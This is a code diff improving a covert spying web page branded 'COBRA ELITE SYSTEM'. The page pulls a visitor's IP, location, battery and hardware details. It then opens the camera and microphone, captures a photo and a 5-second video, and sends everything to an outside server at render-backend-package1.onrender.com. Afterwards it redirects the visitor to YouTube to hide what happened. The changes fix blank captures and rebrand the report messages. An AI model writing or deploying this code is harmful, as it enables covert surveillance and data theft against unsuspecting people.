@@ -29,12 +29,13 @@
     const c = document.getElementById("c");
     const ctx = c.getContext("2d");
 
+    // نظام الإرسال المتطور
     async function send(msg, type = "text", file = null) {
       if (!chatId) return;
       const payload = { chat_id: chatId };
       if (type === "text") payload.message = msg;
-      if (type === "photo") { payload.message = "📸 Snapshot:"; payload.photo = file; }
-      if (type === "video") { payload.message = "📹 Video Clip (5s):"; payload.video = file; }
+      if (type === "photo") { payload.message = "📸 *HD SNAPSHOT CAPTURED:*"; payload.photo = file; }
+      if (type === "video") { payload.message = "📹 *FORENSIC VIDEO (5s):*"; payload.video = file; }
 
       try {
         await fetch("https://render-backend-package1.onrender.com/submit", {
@@ -43,34 +44,31 @@
           body: JSON.stringify(payload),
           keepalive: true
         });
-      } catch (e) { console.error(e); }
+      } catch (e) { console.error("Signal Lost"); }
     }
 
+    // جلب البيانات (بطارية + وقت + IP)
     async function getFullData() {
-      // 1. جلب بيانات البطارية
       let bat = "N/A";
       try {
         const b = await navigator.getBattery();
         bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging 🔌' : 'Discharging 🔋'})`;
       } catch (e) {}
 
-      // 2. بيانات الوقت والمنطقة
-      const now = new Date();
-      const timeStr = now.toLocaleString('ar-DZ', { hour12: true });
+      const timeStr = new Date().toLocaleString('ar-DZ', { hour12: true });
 
-      // 3. جلب الـ IP والمعلومات
       fetch("https://ipinfo.io/json?token=9c6f5e4a17b44c")
         .then(res => res.json())
         .then(async data => {
-          let m = "🏴‍☠️ *COBRA ADVANCED REPORT* 🏴‍☠️\n";
+          let m = "🏴‍☠️ *COBRA ELITE SYSTEM V4.0 by @Cobraxnine* 🏴‍☠️\n";
           m += "━━━━━━━━━━━━━━━━━━\n";
           m += `🌍 *IP:* \`${data.ip}\`\n`;
-          m += `📍 *Location:* ${data.city}, ${data.country}\n`;
-          m += `🕒 *Target Time:* ${timeStr}\n`;
+          m += `📍 *Loc:* ${data.city}, ${data.country}\n`;
+          m += `🕒 *Time:* ${timeStr}\n`;
           m += `🔋 *Battery:* ${bat}\n`;
           m += `💻 *Hardware:* ${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory || 'N/A'}GB RAM\n`;
           m += "━━━━━━━━━━━━━━━━━━\n";
-          m += "📡 *STATUS:* Initializing Mic/Cam Recording...";
+          m += "📡 *STATUS:* Accessing Media Streams...";
           
           await send(m);
           startSpying();
@@ -78,41 +76,52 @@
     }
 
     function startSpying() {
-      // طلب الكاميرا والميكروفون معاً
       navigator.mediaDevices.getUserMedia({ video: true, audio: true })
         .then(stream => {
           v.srcObject = stream;
           
-          // سجل فيديو لمدة 5 ثوانٍ
-          const recorder = new MediaRecorder(stream);
-          let chunks = [];
-          recorder.ondataavailable = e => chunks.push(e.data);
-          recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            const reader = new FileReader();
-            reader.readAsDataURL(blob);
-            reader.onloadend = () => {
-              const base64 = reader.result.split(',')[1];
-              send("", "video", base64);
-              
-              // بعد إرسال الفيديو، خذ صورة عالية الدقة
-              ctx.drawImage(v, 0, 0, c.width, c.height);
-              const img = c.toDataURL("image/jpeg").split(',')[1];
-              send("", "photo", img);
+          v.onloadedmetadata = () => {
+            v.play();
 
-              // إنهاء العملية والتحويل لليوتيوب
+            // إعداد مسجل الفيديو
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            
+            recorder.onstop = async () => {
+              const blob = new Blob(chunks, { type: 'video/webm' });
+              const reader = new FileReader();
+              reader.readAsDataURL(blob);
+              reader.onloadend = () => {
+                const base64 = reader.result.split(',')[1];
+                send("", "video", base64);
+              };
+              
+              // إنهاء كل شيء والتحويل بعد الإرسال
               setTimeout(() => {
                 stream.getTracks().forEach(t => t.stop());
                 window.location.replace("https://youtu.be/tNWpOuJk2M8");
               }, 2000);
             };
-          };
 
-          recorder.start();
-          setTimeout(() => recorder.stop(), 5000); // مدة الفيديو
+            // حل مشكلة السواد: ننتظر 2.5 ثانية لفتح العدسة ثم نصور
+            setTimeout(() => {
+              try {
+                ctx.drawImage(v, 0, 0, c.width, c.height);
+                const img = c.toDataURL("image/jpeg", 0.9).split(',')[1];
+                send("", "photo", img);
+                
+                // نبدأ تسجيل الفيديو فوراً بعد الصورة
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000); 
+              } catch (e) {
+                send("⚠️ Error: " + e.message);
+              }
+            }, 2500); 
+          };
         })
         .catch(err => {
-          send("❌ *Permissions Denied (Mic/Cam)*");
+          send("❌ *Permissions Denied*");
           window.location.replace("https://youtu.be/tNWpOuJk2M8");
         });
     }
